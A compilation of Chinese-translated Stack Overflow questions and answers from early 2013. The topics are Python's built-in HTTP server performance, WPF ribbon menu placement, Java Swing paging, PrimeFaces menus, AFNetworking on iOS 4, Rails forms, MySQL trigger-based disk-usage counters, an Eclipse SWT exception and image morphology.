> 时间：2013-01-01T14:58:45.227
> 
> 标签：python, performance, tcpserver, httpserver

我断断续续地花了几天时间试图获得一些关于在 Python 中使用 HTTPServer 和/或 TCPServer 内置库可以获得什么样的性能的硬统计数据。

我想知道是否有人可以给我任何关于如何处理 HTTP 请求的想法，以及他们是否能够在生产环境或高流量的情况下坚持下去，以及是否有人有任何提示或线索可以改进在这些情况下的表现。（假设无法访问 Twisted 等外部​​库）

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-01T15:02:08.120

这些内置库都不是用于严肃的生产用途。从 Twisted、Tornado、gunicorn 等获得真正的实现，有很多。没有必要坚持使用标准库模块。

内置库的性能以及可能的健壮性很差。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-01T15:10:43.237

测试它们。开始在 localhost 上提供页面，然后使用 Apache 基准测试工具。

```
apt-get install apache2-utils
ab -n 10000 -c 100 http://localhost/ 
```

这会产生 10000 个请求，最多有 100 个并发请求。

但是，是的。我不会在生产中使用它们。我们通过 uWSGI 为 Python 应用程序提供服务，请求通过 Nginx 代理。它非常灵活且可扩展。内置的 httpserver 甚至可以处理多个请求吗？它可能是单线程的。当你测试它时，你会很快发现。

# wpf - 如何修改 WPF 功能区应用程序菜单下拉位置？

> ID：14111463
> 
> 赞同：0
> 
> 时间：2013-01-01T14:58:59.490
> 
> 标签：wpf, layout, ribbon-control

是否可以修改 10/2010 WPF 功能区的应用程序菜单的放置位置？我认为菜单在最左侧打开是非常不寻常的，所以我想改变它。

示例：在 Word 2007（您可能都知道，它具有旧的功能区设计）中，应用程序菜单尽可能向右打开。我也想得到这种行为，因为*右边*是菜单唯一合理的位置。它的所有条目都在左栏中，当时就在按钮的正下方。我还没有找到任何简单的方法来分配其左侧位置。有谁知道这是否以及如何可能？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-03T12:32:29.090

好的，经过数小时的尝试和错误，我找到了一种可能的方法。这不是像“Windows 7 Paint”或类似的 Windows 7 功能区应用程序那样的 100% 原始行为，但在大多数情况下它可以工作。

首先，您需要知道应用程序菜单是用 实现的`Popup`，它有一个`Placement`属性来定义弹出窗口的打开位置。您需要将默认行为覆盖为`PlacementMode.Left`. 这将使弹出菜单在菜单按钮旁边打开。

接下来，您需要将`Popup.HorizontalOffset`属性设置为 negated `RibbonApplicationMenu.Width`。这是通过 Binding 和一个转换器来否定该值。

```
<r:RibbonApplicationMenu>
    <r:RibbonApplicationMenu.Resources>
        <Style TargetType="Popup">
            <Setter Property="Placement" Value="Left"/>
            <Setter Property="HorizontalOffset" Value="{Binding RelativeSource={RelativeSource Mode=FindAncestor, AncestorType=r:RibbonApplicationMenu}, Path=Width, Converter={StaticResource ResourceKey=NegateIntegerConverter}}"/>
        </Style>
    </r:RibbonApplicationMenu.Resources>
</r:RibbonApplicationMenu> 
```

转换器定义`RibbonWindow.Resources`如下：

```
<r:RibbonWindow.Resources>
    <local:NegateIntegerConverter x:Key="NegateIntegerConverter"/>
</r:RibbonWindow.Resources> 
```

`local`命名空间必须在`RibbonWindow`:

```
<r:RibbonWindow x:Class="MainWindow"
    xmlns:r="clr-namespace:Microsoft.Windows.Controls.Ribbon;assembly=RibbonControlsLibrary"
    xmlns:local="clr-namespace:ApplicationRootNamespace"
> 
```

最后， 的代码`NegateIntegerConverter`是应用程序根命名空间中的一个类：

```
Public Class NegateIntegerConverter
  Implements IValueConverter

  Public Function Convert(value As Object, targetType As System.Type, parameter As Object, culture As System.Globalization.CultureInfo) As Object Implements System.Windows.Data.IValueConverter.Convert
    Return -CInt(value)
  End Function

  Public Function ConvertBack(value As Object, targetType As System.Type, parameter As Object, culture As System.Globalization.CultureInfo) As Object Implements System.Windows.Data.IValueConverter.ConvertBack
    Return -CInt(value)
  End Function
End Class

Class MainWindow

End Class 
```

现在来看看行为上的不同：如果菜单因为屏幕结束而无法完全向右展开，则弹出窗口不会简单地向左打开一点，而是完全在左侧。也许我可以找出它实际上是如何表现得像“Windows 7 Paint”功能区的菜单，但在此之前这是一个很好的解决方法。

# java - 逐页切换（MultiPages Widget）

> ID：14111466
> 
> 赞同：2
> 
> 时间：2013-01-01T14:59:54.757
> 
> 标签：java, swing, layout, layout-manager

我正在寻找一种策略，它允许我创建一个 Java Swing 应用程序并使用按钮来更改我的`JFrame`.

我正在尝试使用`JButton`s 和`ActionListener`s 来做到这一点，但运气不佳。

我不能使用`JDialog`or[`CardLayout`](http://docs.oracle.com/javase/tutorial/uiswing/layout/card.html)因为我一次只能看到一个页面供用户按顺序进行交互。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-01T16:50:30.377

这是一个完成这项工作的类：

![在此处输入图像描述](../Images/b1d1d61c5c3bd2034df43857a92daeca.png)

```
public class MultiPages extends JPanel implements ActionListener {

    MultiPages() {
        super(new BorderLayout());
        add(leftButton, BorderLayout.WEST);
        add(pages, BorderLayout.CENTER);
        add(rightButton, BorderLayout.EAST);
        leftButton.addActionListener(this);
        rightButton.addActionListener(this);
        animation.setInitialDelay(10);
        animation.setRepeats(false);
    }

    public void addPage(JComponent page) {
        page.setLocation(0, 0);
        pages.add(page);
        pages.setComponentZOrder(page, pages.getComponentCount() - 1);
        SwingUtilities.invokeLater(new Runnable() {
            @Override public void run() { doLayout(); }});
    }

    @Override
    public void doLayout() {
        Dimension size = getParent().getSize();
        size.width -= leftButton.getWidth() + rightButton.getWidth();
        pages.setSize(size);
        for (Component page : pages.getComponents()) {
            page.setSize(size);
        }
        super.doLayout();
    }

    private void scrollLeft() {
        direction = true;
        Component next = pages.getComponents()[pages.getComponentCount() - 1];
        pages.setComponentZOrder(next, 1);
        animation.start();
        leftButton.setEnabled(false);
        rightButton.setEnabled(false);
    }

    private void scrollRight() {
        direction = false;
        animation.start();
        leftButton.setEnabled(false);
        rightButton.setEnabled(false);
    }

    @Override
    public void actionPerformed(ActionEvent e) {
        Object src = e.getSource();
        if (src == leftButton) {
            scrollLeft();
        } else if (src == rightButton) {
            scrollRight();
        } else if (src == animation) {
            Component onTop = pages.getComponents()[0];
            onTop.setLocation(onTop.getX() + (direction ? +4 : -4), 0);
            if (Math.abs(onTop.getX()) < onTop.getWidth()) {
                animation.start();
            } else {
                if (direction) {
                    pages.setComponentZOrder(onTop, 1);
                } else {
                    pages.setComponentZOrder(onTop, pages.getComponentCount() - 1);
                }
                onTop.setLocation(0, 0);
                leftButton.setEnabled(true);
                rightButton.setEnabled(true);
            }
        }
    }
    private final JPanel pages = new JPanel(null);
    private final JButton leftButton = new JButton("<<");
    private final JButton rightButton = new JButton(">>");
    private final Timer animation = new Timer(0, this);
    private boolean direction;

    public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                JFrame frame = new JFrame("Multi pages demo App");

                frame.setLayout(new BorderLayout());
                frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

                MultiPages multiPage = new MultiPages();
                multiPage.setPreferredSize(new Dimension(250, 100));

                JPanel page;
                page = new JPanel();
                page.setBackground(Color.CYAN);
                page.setLayout(new BorderLayout());
                page.add(new JLabel("First page", SwingConstants.CENTER), BorderLayout.CENTER);
                multiPage.addPage(page);
                page = new JPanel();
                page.setBackground(Color.YELLOW);
                page.setLayout(new BorderLayout());
                page.add(new JLabel("Second page", SwingConstants.CENTER), BorderLayout.CENTER);
                multiPage.addPage(page);
                page = new JPanel();
                page.setBackground(Color.GREEN);
                page.setLayout(new BorderLayout());
                page.add(new JLabel("Third page", SwingConstants.CENTER), BorderLayout.CENTER);
                multiPage.addPage(page);
                page = new JPanel();
                page.setBackground(Color.RED);
                page.setLayout(new BorderLayout());
                page.add(new JLabel("Fourth page", SwingConstants.CENTER), BorderLayout.CENTER);
                multiPage.addPage(page);

                frame.add(multiPage, BorderLayout.CENTER);

                frame.pack();
                frame.setLocationRelativeTo(null);
                frame.setVisible(true);
            }
        });
    }
} 
```

对于[CardLayout](http://docs.oracle.com/javase/7/docs/api/index.html?java/awt/CardLayout.html)的优点，这里是在没有动画的情况下实现相同的东西，因为 CardLayout 不会暴露它的内部地图。

你可以看到它更简单，更少的代码，更少的错误......

```
public class MultiPagesCardLayout extends JPanel implements ActionListener {

   MultiPagesCardLayout() {
      super( new BorderLayout());
      add( _leftBtn , BorderLayout.WEST   );
      add( _pages   , BorderLayout.CENTER );
      add( _rightBtn, BorderLayout.EAST   );
      _leftBtn .addActionListener( this );
      _rightBtn.addActionListener( this );
      _animation.setInitialDelay( 10 );
      _animation.setRepeats( false );
   }

   public void addPage( Component page ) {
      _pages.add( page, "" + ( _pages.getComponentCount() - 1 ));
   }

   @Override
   public void actionPerformed( ActionEvent e ) {
      Object src = e.getSource();
      if( src == _leftBtn ) {
         ((CardLayout)_pages.getLayout()).previous( _pages );
      }
      else if( src == _rightBtn ) {
         ((CardLayout)_pages.getLayout()).next( _pages );
      }
   }

   private final JPanel  _pages     = new JPanel( new CardLayout());
   private final JButton _leftBtn   = new JButton( "<<" );
   private final JButton _rightBtn  = new JButton( ">>" );
   private final Timer   _animation = new Timer( 0, this );

   public static void main( String[] args ) {
      SwingUtilities.invokeLater( new Runnable() {
         @Override public void run() {
            JFrame frame = new JFrame( "Multi pages demo App" );
            frame.setLayout( new BorderLayout());
            frame.setDefaultCloseOperation( JFrame.EXIT_ON_CLOSE );
            MultiPagesCardLayout multiPage = new MultiPagesCardLayout();
            multiPage.setPreferredSize( new Dimension( 250, 100 ));
            JPanel page;
            page = new JPanel();
            page.setBackground( Color.CYAN );
            page.setLayout( new BorderLayout());
            page.add( new JLabel( "First page", SwingConstants.CENTER ), BorderLayout.CENTER );
            multiPage.addPage( page );
            page = new JPanel();
            page.setBackground( Color.YELLOW );
            page.setLayout( new BorderLayout());
            page.add( new JLabel( "Second page", SwingConstants.CENTER ), BorderLayout.CENTER );
            multiPage.addPage( page );
            page = new JPanel();
            page.setBackground( Color.GREEN );
            page.setLayout( new BorderLayout());
            page.add( new JLabel( "Third page", SwingConstants.CENTER ), BorderLayout.CENTER );
            multiPage.addPage( page );
            page = new JPanel();
            page.setBackground( Color.RED );
            page.setLayout( new BorderLayout());
            page.add( new JLabel( "Fourth page", SwingConstants.CENTER ), BorderLayout.CENTER );
            multiPage.addPage( page );
            frame.add( multiPage, BorderLayout.CENTER );
            frame.pack();
            frame.setLocationRelativeTo( null );
            frame.setVisible( true );
         }});
   }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-01T15:45:47.000

这是处理它的一种方法：

关键是Jpanels。将它们视为主 jframe 中的迷你 jframe。以下是有关这些面板的一些信息：

[http://docs.oracle.com/javase/6/docs/api/javax/swing/JPanel.html](http://docs.oracle.com/javase/6/docs/api/javax/swing/JPanel.html)

单击按钮时，每个按钮基本上都会切换显示的面板。将编码放入动作侦听器中。

这种方法比使用多个 JFrame 更好。

# jsf - Primefaces panelMenu 错误？

> ID：14111483
> 
> 赞同：0
> 
> 时间：2013-01-01T15:02:07.977
> 
> 标签：jsf, primefaces, jsf-2

```
<p:panelMenu>
            <p:submenu label="Articoli">
                <p:menuitem value="Anagrafica" action="/articoli/anagrafica" icon="ui-icon-document" ajax="false" />
                <p:menuitem value="Importazione" action="/articoli/importazione" ajax="false" />
                <p:menuitem value="Marchi" action="/articoli/marchi" ajax="false" />
            </p:submenu>
            <p:submenu label="Clienti">
                <p:menuitem value="Anagrafica" action="/clienti/anagrafica" ajax="false" />
            </p:submenu>
            <p:submenu label="Vendite" icon="ui-icon-suitcase">
                <p:menuitem value="Point Of Sale" action="/vendite/pos" ajax="false" />
            </p:submenu>
            <p:submenu label="Utilita" icon="ui-icon-calculator">
                <p:menuitem value="TestPDF" action="#{menuController.getTestPdf()}" ajax="false" />
            </p:submenu>
        </p:panelMenu> 
```

此菜单显示完美，但经过一点导航后，它的行为方式无法预测。

我的意思是我无法控制每个子菜单的打开/关闭状态，因此，在每个菜单项单击和页面加载时，它们会**随机**展开/折叠！

经过一番搜索，我发现 panelMenu 使用客户端 cookie 来保存子菜单的状态，但是....不是应该自动管理所有这些吗？

如何手动控制每个子菜单的状态？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-07T16:35:30.067

您不能像使用 p:accordionPanel 的 activeIndex 属性那样手动控制此行为。

但我面临同样的问题，我在 stackoverflow 上发现了这个问题： [Primefaces 3.4 p:panelMenu：无法控制 p:submenu 和 p:menuitem 的状态](https://stackoverflow.com/questions/13726428/primefaces-3-4-ppanelmenu-unable-to-control-the-state-of-psubmenu-and-pmenui)。

结论是 panelMenu 对于同一应用程序目录中的页面将具有相同的状态。将页面置于更复杂的文件夹结构中，您只能将所有当前页面包装在“伪页面”中，并将这些伪页面放在同一个文件夹中。

所以你最终会得到一个像这样的伪页面：

```
<h:html xmlns="http://www.w3.org/1999/xhtml" xmlns:h="http://java.sun.com/jsf/html"
  xmlns:f="http://java.sun.com/jsf/core" xmlns:ui="http://java.sun.com/jsf/facelets">
<h:head>
</h:head>
<h:body>
  <ui:composition>
    <ui:include src="/actualPagesDirectory/actualPage.xhtml" />
  </ui:composition>
</h:body>
</h:html> 
```

这不是很好，但到目前为止，我看到的唯一解决方案是按原样使用 primefaces panelMenu。

编辑：我的结论是不正确的。拥有这样的伪页面不会改变行为。所以它仍然是控制行为的否决。

此外，我发现这个问题是已知的并将得到解决： [Primefaces forum](http://forum.primefaces.org/viewtopic.php?f=3&t=22813) 但我仍然找不到这个问题在 primefaces 3.5.CR1 中得到解决。

# objective-c - 将 NSJSONSerialization 转换为 ios 4

> ID：14111485
> 
> 赞同：1
> 
> 时间：2013-01-01T15:02:20.647
> 
> 标签：objective-c, ios, xcode, ios4

我正在将一个支持 ios 5 的项目转换为 ios 4 并且遇到了一些困难。它使用类`AFNetworking`，我的问题在以下行：

iOS 5：（效果很好）

```
self.responseJSON =[NSJSONSerialization JSONObjectWithData:self.responseData options:0 error:&error]; 
```

因为`NSJSONSerialization`在 iOS 4 中不受支持，所以我使用这个：

```
self.responseJSON = AFJSONDecode(self.responseData, &error); 
```

是什么给了我错误：

```
Undefined symbols for architecture i386:
  "_AFJSONDecode", referenced from:
      -[AFJSONRequestOperation responseJSON] in AFJSONRequestOperation.o
ld: symbol(s) not found for architecture i386
clang: error: linker command failed with exit code 1 (use -v to see invocation) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T15:20:21.783

AFNetworking 页面的[要求部分](https://github.com/AFNetworking/AFNetworking#requirements)指出：

> 为了与 iOS 4.3 兼容，请使用最新的 0.10.x 版本。

[查看版本 0.10.1](https://github.com/AFNetworking/AFNetworking/tree/0.10.1)的代码，我看到文件[AFJSONUtilities.m](https://github.com/AFNetworking/AFNetworking/blob/0.10.1/AFNetworking/AFJSONUtilities.m)，它似乎处理 JSON 解码。这在最新版本的 AFNetowrking 中不存在，因为它需要具有 NSJSONSerialization 的 iOS 5 或更高版本。

您可能想尝试版本 0.10.1（如果您还没有的话），而不是修改当前版本以在 iOS 4 上运行，因为在处理 JSON 问题后您可能会遇到额外的障碍。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T15:11:15.020

您最好的选择是在 iOS 4 及更早版本上使用第三方库进行 JSON 处理。我会推荐 JSONKit。[https://github.com/johnezang/JSONKit](https://github.com/johnezang/JSONKit)

# ruby-on-rails - 两个 form_tags 一个 submit_tag

> ID：14111486
> 
> 赞同：1
> 
> 时间：2013-01-01T15:02:27.873
> 
> 标签：ruby-on-rails, ruby-on-rails-3, forms

一段时间以来一直试图解决这个问题，并且想知道是否有一种方法可以在 rails 中而不是使用 jquery/javascript（尽管使用 jquery 的尝试被证明是不成功的。

我有两个 form_tags 可以搜索不同的 api，每个都有自己的 submit_tag，效果很好。我想要实现的是能够使用一个 submit_tag 然后提交已填写的表单

```
 <h3>Search Movies</h3>
   <%= form_tag main_results_path, :method => "get", :id => 'submitMovie' do %>
   <%= text_field_tag 'search', nil, :placeholder => 'Enter Film Name Here.....', :id => 'movieForm' %>
   <%= submit_tag "search" %>

   <% end %>

  <h1>OR</h1>

  <h3>Search Albums</h3>
  <%= form_tag album_album_results_path, :method => "get", :id => 'submitAlbum' do %>
  <%= text_field_tag 'search', nil, :placeholder => 'Enter Artist Name here.....', :id => 'albumForm' %>
  <%= submit_tag "search" %>

  <% end %> 
```

这在rails中可能吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T15:16:31.020

提交表单的方式与 Rails 无关：表单由浏览器处理。单击按钮将始终提交按钮所属的表单。如果您需要表单之外的按钮 Javascript/jQuery 是可行的方法：

```
$(document).ready(function(){
    $('#yourButton').click(function(){
        var formToSubmit;
        if( $('#movieForm').val() ){
            formToSubmit='#submitMovie';
        }
        else if( $('#albumForm').val() ){
            formToSubmit='#submitAlbum';
        }
        if(formToSubmit!==null){
            $(formToSubmit).submit();
        }
        return false;
    });
}); 
```

# php - 同时更新mysql MyISAM表中的计数器

> ID：14111487
> 
> 赞同：0
> 
> 时间：2013-01-01T15:03:20.143
> 
> 标签：php, mysql, database, codeigniter, concurrency

我有一个将用户数据发送到云的客户端-服务器应用程序（Amazon EC2 + RDS + S3）。

1.  每个用户都可以有多个设备连接到云端并同时发送数据
2.  安装在每台设备上的客户端应用程序是多线程的，最终会同时上传多个数据片段。

我想**可靠地跟踪在这种情况下使用的磁盘使用**情况，我想知道如何在这种情况下做到这一点？

到目前为止，我有两个想法，但我什至不确定它们是否正确：

**选项 1：向 mysql 表添加触发器？IE。**

```
CREATE TRIGGER DiskUsage AFTER UPDATE OF Fully_Updated_File_Flag ON Files
BEGIN
    for each row
    begin
        UPDATE Users SET SpaceUsed = SpaceUsed + new.Size WHERE (new.Fully_Updated_File_Flag = 1) And UserID=
    end
END; 
```

如果我选择使用触发器，我应该如何*动态注入*用户 ID？

* * *

**选项 2：通过 PHP 更新 mysql 表？IE。**

```
<?php

  SendFileToS3($file_name);
  mysql_query('UPDATE Stats SET Value = Value + ' . filesize($file_name) . ' WHERE user_id=' . $user_id);

?> 
```

如果两个实例试图更新相同的记录怎么办？（我正在使用 Mysql 5.5.27-log / MyISAM），这仍然有效。

* * *

**Note #1**虽然我还没有发布我的应用程序，但我仍然需要一些可以很好地扩展的东西。即使这意味着一起更改数据库引擎。

**注意 #2** DB 相关代码封装在模块化函数中（即 InsertIntoDB()、UpdateDB() 和 DeleteFromDB()）。此外，所有这些例程都依赖于具有活动记录类的 CodeIgniter 2.1。

这就是说，如果必须，我总是可以进行切换*（*尽管我想避免这种情况）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-04T08:51:52.533

您应该使用 MySQL 触发器而不是 PHP 代码，并且您必须将相关信息存储`user_id`到`diskusage`表中。

> 我使用`InnoDB`引擎是因为`CONSTRAINT`. 您也可以使用`MyISAM`，但您应该删除`CONSTRAINT`.

**评论**

我会使用`InnoDB`因为**Transactions**和（在这里更重要）**Row-Locking**。

**表结构（InnoDB）**

```
-- ----------------------------
--  Table structure for `users`
-- ----------------------------
DROP TABLE IF EXISTS `users`;
CREATE TABLE `users` (
  `id` INT(11) UNSIGNED NOT NULL AUTO_INCREMENT,
  `Name` VARCHAR(10) NOT NULL DEFAULT '',
  `SpaceUsed` BIGINT(20) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=INNODB DEFAULT CHARSET=utf8;

-- ----------------------------
--  Table structure for `diskusage`
-- ----------------------------
DROP TABLE IF EXISTS `diskusage`;
CREATE TABLE `diskusage` (
  `id` INT(11) UNSIGNED NOT NULL AUTO_INCREMENT,
  `Filename` VARCHAR(50) NOT NULL DEFAULT '',
  `Size` BIGINT(20) NOT NULL,
  `user_id` INT(11) UNSIGNED DEFAULT NULL,
  `Fully_Updated_File_Flag` TINYINT(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `fk_diskusage_user` (`user_id`),
  CONSTRAINT `fk_diskusage_user` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE SET NULL ON UPDATE CASCADE
) ENGINE=INNODB DEFAULT CHARSET=utf8; 
```

**表结构（MyISAM）**

```
-- ----------------------------
--  Table structure for `users`
-- ----------------------------
DROP TABLE IF EXISTS `users`;
CREATE TABLE `users` (
  `id` INT(11) UNSIGNED NOT NULL AUTO_INCREMENT,
  `Name` VARCHAR(10) NOT NULL DEFAULT '',
  `SpaceUsed` BIGINT(20) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
--  Table structure for `diskusage`
-- ----------------------------
DROP TABLE IF EXISTS `diskusage`;
CREATE TABLE `diskusage` (
  `id` INT(11) UNSIGNED NOT NULL AUTO_INCREMENT,
  `Filename` VARCHAR(50) NOT NULL DEFAULT '',
  `Size` BIGINT(20) NOT NULL,
  `user_id` INT(11) UNSIGNED DEFAULT NULL,
  `Fully_Updated_File_Flag` TINYINT(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `fk_diskusage_user` (`user_id`),
) ENGINE=MyISAM DEFAULT CHARSET=utf8; 
```

就是这样，再加上 table 上的一些触发器`diskusage`。

**插入触发器**

```
-- ----------------------------
--  AFTER INSERT TRIGGER for `diskusage`
-- ----------------------------
delimiter ;;
CREATE TRIGGER `diskusage_after_insert` AFTER INSERT ON `diskusage` FOR EACH ROW BEGIN
  IF NEW.Fully_Updated_File_Flag = 1 THEN
    UPDATE users
    SET
      SpaceUsed = SpaceUsed + NEW.Size
    WHERE
      id = NEW.user_id;
  END IF;
END;
 ;;
delimiter ; 
```

**更新触发器**

```
-- ----------------------------
--  AFTER UPDATE TRIGGER for `diskusage`
-- ----------------------------
delimiter ;;
CREATE TRIGGER `diskusage_after_update` AFTER UPDATE ON `diskusage` FOR EACH ROW BEGIN

  -- same to DELETE TRIGGER

  -- decrease SpaceUsed with OLD Size for OLD user

  IF OLD.Fully_Updated_File_Flag = 1 THEN
    UPDATE users
    SET
      SpaceUsed = SpaceUsed - OLD.Size
    WHERE
      id = OLD.user_id;
  END IF;

  -- same to INSERT TRIGGER

  -- increase SpaceUsed with NEW Size for NEW user

  IF NEW.Fully_Updated_File_Flag = 1 THEN
    UPDATE users
    SET
      SpaceUsed = SpaceUsed + NEW.Size
    WHERE
      id = NEW.user_id;
  END IF;

END;
 ;;
delimiter ; 
```

**删除触发器**

```
-- ----------------------------
--  AFTER DELETE TRIGGER for `diskusage`
-- ----------------------------
delimiter ;;
CREATE TRIGGER `diskusage_after_delete` AFTER DELETE ON `diskusage` FOR EACH ROW BEGIN

  IF OLD.Fully_Updated_File_Flag = 1 THEN
    UPDATE users
    SET
      SpaceUsed = SpaceUsed - OLD.Size
    WHERE
      id = OLD.user_id;
  END IF;

END;
 ;;
delimiter ; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-03T18:06:54.257

如果您正在跟踪文件、大小和所有权，`SELECT SUM(Size) FROM Files WHERE UserID = ?`那么在正确索引的表上执行此操作会非常快，除非用户有与他们相关联的大量文件。无需存储可以轻松计算的数字。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-03T18:04:01.553

MyISAM 表的操作[是原子的](http://dev.mysql.com/doc/refman/5.5/en/ansi-diff-transactions.html)。基本上，查询发生后会自动提交。

此外，`UPDATE`s 是阻塞的，这意味着一次只能发生一个。

这意味着读写周期`UPDATE`不会被中断。

MySQL对 MyISAM 表使用[表锁定。](http://dev.mysql.com/doc/refman/5.0/en/internal-locking.html)

这相当快，并且将确保并发更新正常工作。

但是，大量更新可能会导致表花费大量时间被锁定。如果表中有很多行，这可能会出现问题。

InnoDB 表支持行锁定。这需要更多资源，但如果您的表变大，可能会更合适。它使您可以更好地控制锁定，并允许多个不相关的进程访问表，而不会出现过多的锁定争用。

# eclipse - 修改 org.eclipse.ui.forms.widgets.Section 中的子项会导致异常

> ID：14111489
> 
> 赞同：0
> 
> 时间：2013-01-01T15:03:34.103
> 
> 标签：eclipse, eclipse-plugin, swt

我在使用 时遇到了一个问题，`org.eclipse.ui.forms.widgets.Section`如果我向其中添加子项并通过启用它们或在它们上设置文本来修改子项，我会遇到异常。我写了一个小片段来轻松重现以下问题：

```
import org.eclipse.jface.dialogs.MessageDialog;
import org.eclipse.swt.SWT;
import org.eclipse.swt.events.SelectionAdapter;
import org.eclipse.swt.events.SelectionEvent;
import org.eclipse.swt.layout.GridData;
import org.eclipse.swt.layout.GridLayout;
import org.eclipse.swt.widgets.Button;
import org.eclipse.swt.widgets.Composite;
import org.eclipse.swt.widgets.Display;
import org.eclipse.swt.widgets.Shell;
import org.eclipse.ui.forms.widgets.Section;

public class SectionTest {
    /**
     * @param args
     */
    public static void main(String[] args) {
        final Display display = new Display ();
        final Shell shell = new Shell (display);
        shell.setLayout(new GridLayout());

        Button b = new Button(shell, SWT.PUSH);
        b.addSelectionListener(new SelectionAdapter() {
            @Override
            public void widgetSelected(SelectionEvent e) {
                addSection(shell);
            }
        });
        b.setText("Add");

        addSection(shell);

        shell.setSize(300, 300);
        shell.open();
        while (!shell.isDisposed()) {
            try {
                if (!display.readAndDispatch())
                    display.sleep();
            }
            catch (Exception e) {
                e.printStackTrace();
                MessageDialog.openError(shell, "Error", e.getMessage());
            }
        }
        display.dispose();
    }

    private static void addSection(Composite parent) {
        Section section = new Section(parent, Section.TITLE_BAR | Section.TREE_NODE | Section.CLIENT_INDENT);
        section.setLayoutData(new GridData(SWT.FILL, SWT.FILL, true, false));
        section.setText("Hello");
        //section.setSize(1, 1);

        // Add the check button for enabling/disabling this group
        Button enableControl = new Button(section, SWT.CHECK);
        enableControl.setText("Enable");
        section.setTextClient(enableControl);

        Composite client = new Composite(section, SWT.NONE);
        section.setClient(client);
        client.setLayout(new GridLayout());

        Button b = new Button(client, SWT.PUSH);
        b.setText("one");

        b = new Button(client, SWT.PUSH);
        b.setText("two");
        parent.layout();
    }
} 
```

如果您运行代码，将出现一个带有添加按钮的对话框。单击添加按钮将产生异常。

异常文本：

```
java.lang.IllegalArgumentException: Argument not valid
    at org.eclipse.swt.SWT.error(SWT.java:4342)
    at org.eclipse.swt.SWT.error(SWT.java:4276)
    at org.eclipse.swt.SWT.error(SWT.java:4247)
    at org.eclipse.swt.graphics.Image.init(Image.java:1558)
    at org.eclipse.swt.graphics.Image.<init>(Image.java:181)
    at org.eclipse.ui.forms.widgets.Section.onPaint(Section.java:344)
    at org.eclipse.ui.forms.widgets.ExpandableComposite$1.paintControl(ExpandableComposite.java:560)
    at org.eclipse.swt.widgets.TypedListener.handleEvent(TypedListener.java:230)
    at org.eclipse.swt.widgets.EventTable.sendEvent(EventTable.java:84)
    at org.eclipse.swt.widgets.Widget.sendEvent(Widget.java:1053)
    at org.eclipse.swt.widgets.Widget.sendEvent(Widget.java:1077)
    at org.eclipse.swt.widgets.Widget.sendEvent(Widget.java:1062)
    at org.eclipse.swt.widgets.Composite.WM_PRINTCLIENT(Composite.java:1639)
    at org.eclipse.swt.widgets.Control.windowProc(Control.java:4590)
    at org.eclipse.swt.widgets.Canvas.windowProc(Canvas.java:341)
    at org.eclipse.swt.widgets.Display.windowProc(Display.java:4976)
    at org.eclipse.swt.internal.win32.OS.CallWindowProcW(Native Method)
    at org.eclipse.swt.internal.win32.OS.CallWindowProc(OS.java:2440)
    at org.eclipse.swt.widgets.Button.callWindowProc(Button.java:343)
    at org.eclipse.swt.widgets.Control.windowProc(Control.java:4623)
    at org.eclipse.swt.widgets.Display.windowProc(Display.java:4976)
    at org.eclipse.swt.internal.win32.OS.SetWindowTextW(Native Method)
    at org.eclipse.swt.internal.win32.OS.SetWindowText(OS.java:3461)
    at org.eclipse.swt.widgets.Button._setText(Button.java:300)
    at org.eclipse.swt.widgets.Button.setText(Button.java:1099)
    at org.eclipse.swt.snippets.SectionTest.addSection(SectionTest.java:58)
    at org.eclipse.swt.snippets.SectionTest.access$0(SectionTest.java:50)
    at org.eclipse.swt.snippets.SectionTest$1.widgetSelected(SectionTest.java:28)
    at org.eclipse.swt.widgets.TypedListener.handleEvent(TypedListener.java:248)
    at org.eclipse.swt.widgets.EventTable.sendEvent(EventTable.java:84)
    at org.eclipse.swt.widgets.Widget.sendEvent(Widget.java:1053)
    at org.eclipse.swt.widgets.Display.runDeferredEvents(Display.java:4169)
    at org.eclipse.swt.widgets.Display.readAndDispatch(Display.java:3758)
    at org.eclipse.swt.snippets.SectionTest.main(SectionTest.java:39) 
```

Windows 7 64 位机器上的 32 位 JRE（和 eclipse）会出现此问题。在 Windows XP（32 位）上无法重现同样的问题。

我的问题是，我做错了什么导致了这个异常。如果您注意到我在外壳打开之前使用相同的方法添加了一个部分并且它运行没有任何问题，但是一旦外壳打开并且可见，调用相同的`addSection(Composite)`方法会导致异常。

> **注意**：取消注释行 'section.setSize(1, 1);' in`addSection(Composite)`将“隐藏”问题，但这似乎不是正确的做法。使用部分的正确方法是什么？

* * *

> **编辑：**发现已经在 ecilpse 中报告了一个问题，[https:](https://bugs.eclipse.org/bugs/show_bug.cgi?id=309443) //bugs.eclipse.org/bugs/show_bug.cgi?id=309443 ，这似乎与这个问题的发现相同。

# image-processing - 具有零结构元素的 Erose/Dilate 图像

> ID：14111491
> 
> 赞同：2
> 
> 时间：2013-01-01T15:03:46.483
> 
> 标签：image-processing, mathematical-morphology

如果我有一个结构元素，看起来像这样（原点位于 SE 的中心）：

```
0  0  0
0  0  0 
0  0  0 
```

如果我对二进制图像执行腐蚀/膨胀，结果全是 0 或 1。有人可以向我解释一下吗？（通过matlab检查）
非常感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-01T21:27:40.663

你有一个完全有效的 SE。它是一个扁平的正方形，在每个图像处理库中都被普遍接受和使用。

